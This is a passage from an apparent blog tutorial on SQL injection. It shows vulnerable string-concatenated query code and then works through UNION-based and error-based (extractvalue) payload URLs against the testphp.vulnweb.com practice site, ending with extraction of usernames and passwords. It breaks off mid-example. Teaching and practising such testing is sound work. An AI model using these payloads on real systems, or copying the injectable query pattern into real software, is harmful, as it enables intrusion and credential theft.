</pre></table></code></div></div><p><br /> <br /> There are few operants that you need to know.<br /> <code class="language-plaintext highlighter-rouge">^</code>=XOR operator <code class="language-plaintext highlighter-rouge">!</code>=NOT operator</p></ul><h3 id="discipline">Discipline</h3><p>We have discovered some primitive behaviours of the database. Now we need to understand which discipline we need to adopt to find a sql injection.</p><p>Lets say there is a back end code running at the server just like that.</p><p>PSEUDO CODE</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"No news"</span><span class="p">)</span>
</pre></table></code></div></div><p>This is the pseudo code to illustrate possible setup working on a web server to bring html document. However we do not have access to this backend code, so what we are trying to do is that, we need to observe the behavior of the responds to see if there is an injection possiblity.</p><p>Now lets say there are two html pages, one for id â€˜1â€™, and one for id â€˜2â€™:</p><p>ID1</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;h1&gt;</span>This is html document for ID 1<span class="nt">&lt;/h1&gt;</span>
</pre></table></code></div></div><p>ID2</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;h1&gt;</span>This is html document for ID 2<span class="nt">&lt;/h1&gt;</span>
</pre></table></code></div></div><p>While we dont have access to backend code, we can modify url.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>www.xyz.com/?id=
</pre></table></code></div></div><p>As you can tell, we can bring one of those two html documents by passing related ID number to the <code class="language-plaintext highlighter-rouge">?id=</code> parameter.<br /> Right now all the behaviour we have learned should make sense. We can either make request for <code class="language-plaintext highlighter-rouge">?id=1</code> or <code class="language-plaintext highlighter-rouge">=id=2-1</code>, both will bring the first html document which has ID1.</p><h4 id="principles">Principles</h4><ul><li>We need to determine an initial, referance point for our examination. In this case, it is html document of ID1 which we trying to return.<li>Try to access to the initial point with different methods. In this case we forced database to make that 2-1 operation to get out initial point. <br /></ul><p>From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpected behavior. Key point is that, you could return your referance point with avoiding expected behavior.<br /><br /> The question is that, what now ? How we can turn this vulnerability to our favour ? <br /> In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where <code class="language-plaintext highlighter-rouge">UNION</code> saves the day. <br /> Instead of passing <code class="language-plaintext highlighter-rouge">1</code> or <code class="language-plaintext highlighter-rouge">2</code> or <code class="language-plaintext highlighter-rouge">2-1</code> into the <code class="language-plaintext highlighter-rouge">?id=</code> field, we can pass <code class="language-plaintext highlighter-rouge">1 UNION SELECT (rest of the query)</code><br /> As you remember that is the code at the back end.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">www.xyz.com/?id='1 UNION SELECT .....'</code> <br /> <br />Query will run this for http request above-&gt; <code class="language-plaintext highlighter-rouge">SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query)</code> <br /> However at this point of time, we have two problems.<br /> 1-What I will select in my own query ? What will replace the ,I do not know anything about the database.<br /> 2-<code class="language-plaintext highlighter-rouge">UNION</code> has its limitations, the number of columns that return for each query should match.<br /> It is time to do some real sql injection on a web page.</p><h2 id="vulnweb---union-sqli">VULNWEB - UNION SQLi</h2><p><a href="http://test.php.vulnweb.com">http://test.php.vulnweb.com</a> is a vulnerable website for pentesting practice. Navigate to the web page.</p><h3 id="remembering-the-principles">Remembering the principles</h3><p>As we talked it about before, we have a principle that has two parts. <br /> 1-Determine your referance point <br /> 2-Find a way to get back to that referance point with unexpected behavior. <br /></p><h3 id="making-sure-of-sql-injections-existence">Making sure of SQL injectionâ€™s existence</h3><p>Navigate to <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a> <br />This will be our referance point.<br /><br /> Than to <a href="http://testphp.vulnweb.com/listproducts.php?cat=2">http://testphp.vulnweb.com/listproducts.php?cat=2</a> <br />As we see different cat id brings different items from table.<br /><br /> Than go for <a href="http://testphp.vulnweb.com/listproducts.php?cat=2-1">http://testphp.vulnweb.com/listproducts.php?cat=2-1</a> <br /><br />We tried an unexpected behavior, and eventually returned to our referance point. <br />Thus, now it is certain that this web site vulnerable to sql injection. <br />And this is because there is no <strong>input validation</strong> in the source code that is running on server side and anybody can pass whatever value they want in the input field, in this case in the <code class="language-plaintext highlighter-rouge">?id=</code> field. <br /></p><h3 id="guessing-the-design">Guessing the design</h3><p>If you observe the url, you can guess there is a table named <code class="language-plaintext highlighter-rouge">listproducts</code> and a column named <code class="language-plaintext highlighter-rouge">cat</code>.<br /> Backend code may work like that:<br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="p">(</span><span class="k">some</span> <span class="k">unknown</span> <span class="k">column</span> <span class="k">names</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">listproducts</span> <span class="k">WHERE</span> <span class="n">cat</span><span class="o">=</span>
</pre></table></code></div></div><p>Of course those names are not the same like that at the source code, so we still do not know any names from the database. And of course it may not work like that, just like I said, it is guessing. <br /> After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">pass</span>
</pre></table></code></div></div><h3 id="finding-the-column-count">Finding the column count</h3><p>As we talked before, after finding the vulnerability with <code class="language-plaintext highlighter-rouge">2-1</code>, it is crucial to run our own queries.<br /> <code class="language-plaintext highlighter-rouge">UNION</code> will be starting point for this example. However we need to know how many columns there are.<br />The way to do that is enumerate: <br /><code class="language-plaintext highlighter-rouge">1 UNION SELECT 1</code> to <code class="language-plaintext highlighter-rouge">1 UNION SELECT 1....x</code>. <br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql10.jpg" alt="Desktop View" /> <br /> As you can see, when the number of columns are not match, this happens. <br /><br />To give you better understanding about this I will demonstrate this on my local machine with a test table.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
<span class="o">|</span>        <span class="mi">2</span> <span class="o">|</span> <span class="n">Baris2</span>   <span class="o">|</span> <span class="n">Burak2</span>    <span class="o">|</span>
<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1222</span> <span class="p">(</span><span class="mi">21000</span><span class="p">):</span> <span class="n">The</span> <span class="n">used</span> <span class="k">SELECT</span> <span class="n">statements</span> <span class="n">have</span> <span class="n">a</span> <span class="n">different</span> <span class="n">number</span> <span class="k">of</span> <span class="n">columns</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1222</span> <span class="p">(</span><span class="mi">21000</span><span class="p">):</span> <span class="n">The</span> <span class="n">used</span> <span class="k">SELECT</span> <span class="n">statements</span> <span class="n">have</span> <span class="n">a</span> <span class="n">different</span> <span class="n">number</span> <span class="k">of</span> <span class="n">columns</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>         <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------+-----------+</span>

</pre></table></code></div></div><p>There are three columns for this table, <code class="language-plaintext highlighter-rouge">Person ID</code>, <code class="language-plaintext highlighter-rouge">LastName</code>, <code class="language-plaintext highlighter-rouge">FirstName</code>.It means the second query I will run after <code class="language-plaintext highlighter-rouge">UNION</code> should also have three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table with a blank column. As you can see I am getting the same error as the error on website when the number of columns are not match. <br /> <br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql9.jpg" alt="Desktop View" /> <br /> After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total. Scroll down to the bottom, you should see someting different. <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11</a> <br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg" alt="Desktop View" /> <br /> There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the html document that contained in second, seventh and nineth columns in the table.<br /> It means that we can run whatever we want in that areas to extract information from the database. For example lets run <code class="language-plaintext highlighter-rouge">version()</code> helper function at second, seventh or nienth column to see version of the server that running the database. <br /> <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11</a> <br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql11.jpg" alt="Desktop View" /> <br /> After this point of time, all the helper functions are available for you.You can run the following to avoid first part of the sql query to only see your own query by selecting something non existent from the database. <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11</a></p><h3 id="extracting-the-table-names">Extracting the table names</h3><p>First thing to do is to gather all the table names exists in the database.For MySQl it is <code class="language-plaintext highlighter-rouge">information_schema</code> which provides access to database metadata.We are going to use methods of that information_schema to enumerate the database. Even though helper functionâ€™s syntax or names will vary database to database, there is always a functionality doing the same thing with for different database. <br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
<span class="o">+</span><span class="c1">------------+</span>
<span class="o">|</span> <span class="k">table_name</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+</span>
<span class="o">|</span> <span class="n">users</span>      <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+</span>
</pre></table></code></div></div><p>With <code class="language-plaintext highlighter-rouge">tables</code> method belongs to <code class="language-plaintext highlighter-rouge">information_schema</code>, we can query the table names.<br /> Now lets imply this method to the acuart database. <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()</a> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql12.jpg" alt="Desktop View" /> <br /> Awesome, we got all the table names storing in the acurat db.</p><h3 id="extracting-the-column-names">Extracting the column names</h3><p>Just like <code class="language-plaintext highlighter-rouge">tables</code>, there is also <code class="language-plaintext highlighter-rouge">columns</code> method belongs to <code class="language-plaintext highlighter-rouge">information_schema</code>.However, to use that target-spesific, first we needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span> <span class="k">column_name</span>         <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span> <span class="n">PersonID</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">LastName</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">FirstName</span>           <span class="o">|</span>
<span class="o">|</span> <span class="n">PersonID</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">FirstName</span>           <span class="o">|</span>
<span class="o">|</span> <span class="n">LastName</span>            <span class="o">|</span>
<span class="o">|</span> <span class="k">USER</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">CURRENT_CONNECTIONS</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">TOTAL_CONNECTIONS</span>   <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
</pre></table></code></div></div><p>Now lets imply this method to the acuart database. <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name=&quot;users&quot;">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users"</a> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql13.jpg" alt="Desktop View" /> <br /> We now have got all the column names in the â€˜usersâ€™ table, â€˜unameâ€™ and â€˜passâ€™ columns are intresting : ) <br /></p><h3 id="extracting-values-from-columns">Extracting values from columns</h3><p>After this point, our aim is certain, and simple. We need to get â€˜unameâ€™ and â€˜passâ€™ fields in users table. One simple query to get those values, for example just like this.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">FirstName</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-----------+</span>
<span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+</span>
<span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
<span class="o">|</span> <span class="n">Burak2</span>    <span class="o">|</span>
<span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+</span>
</pre></table></code></div></div><p>So lets imply this to acuart. <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat(&quot;Username:&quot;,uname, &quot; Password:&quot;,pass),8,9,10,11 FROM users">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat("Username:",uname, " Password:",pass),8,9,10,11 FROM users</a> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql14.jpg" alt="Desktop View" /> <strong>Congrats !!</strong> we got the username and password fields.</p><h3 id="concat-method">Concat method</h3><p>As you see above, I used concat for string formatting.Lets see how it is working from our example database.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nv">"FN:"</span><span class="p">,</span><span class="n">FirstName</span><span class="p">,</span> <span class="nv">"  LN:"</span><span class="p">,</span><span class="n">LastName</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-------------------------------------------+</span>
<span class="o">|</span> <span class="n">concat</span><span class="p">(</span><span class="nv">"FN:"</span><span class="p">,</span><span class="n">FirstName</span><span class="p">,</span> <span class="nv">"  LN:"</span><span class="p">,</span><span class="n">LastName</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-------------------------------------------+</span>
<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris</span>                        <span class="o">|</span>
<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak2</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris2</span>                      <span class="o">|</span>
<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak3</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris3</span>                      <span class="o">|</span>
<span class="o">+</span><span class="c1">-------------------------------------------+</span>
</pre></table></code></div></div><h3 id="guess-correction">Guess correction</h3><p>As you remember, at the <code class="language-plaintext highlighter-rouge">Guessing the design</code> heading, we come up with a possible query that runs at the server just by observing the behaviour of the web application. After doing more scans in the database, I see that, that guess we made above, is kind of close to the real design.</p><p><a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1</a> <br /> Gives the same result as: <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></p><h2 id="vulnweb---error-based-sqli">VULNWEB - ERROR BASED SQLi</h2><p>As you remember, this is the pseudo code for testphp.vulnweb website.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
<span class="c1">#Try:
</span><span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="c1">#Except:
</span>    <span class="c1">#pass
</span>
<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">pass</span>
</pre></table></code></div></div><p>I have added those comment lines intentionally.If we had those <code class="language-plaintext highlighter-rouge">Try</code> and <code class="language-plaintext highlighter-rouge">Except</code> lines, or any other exception handling method with another language that is used in the server side code, we could not have see this error message. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/15.jpg" alt="Desktop View" /> <br /> Spesifically speaking for the pseudo code above, when <code class="language-plaintext highlighter-rouge">execute(query)</code> method returns a result to the <code class="language-plaintext highlighter-rouge">result</code> variable from database. <code class="language-plaintext highlighter-rouge">if result.size()&gt;0</code> means that, if we have returned something from query, print it, it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, result variable would not be declared at all if the query result is not accurate. <br /> This is a <strong>catastrophic mis-coding</strong> for the server, because we can use this error message to extract data from it. <br /></p><h3 id="extract-value-method">Extract value method</h3><p>As in the example, database return the unexpected string in error message. That means that, we see what we give in the input field.Instead of seeing what we give as a string, it is possible that to return values from database.<br /> There is a helper function that we can use, which is <code class="language-plaintext highlighter-rouge">ExtractValue()</code>.</p><p><a href="http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))">http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))</a> <br /> Query will look like this on the server side.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far 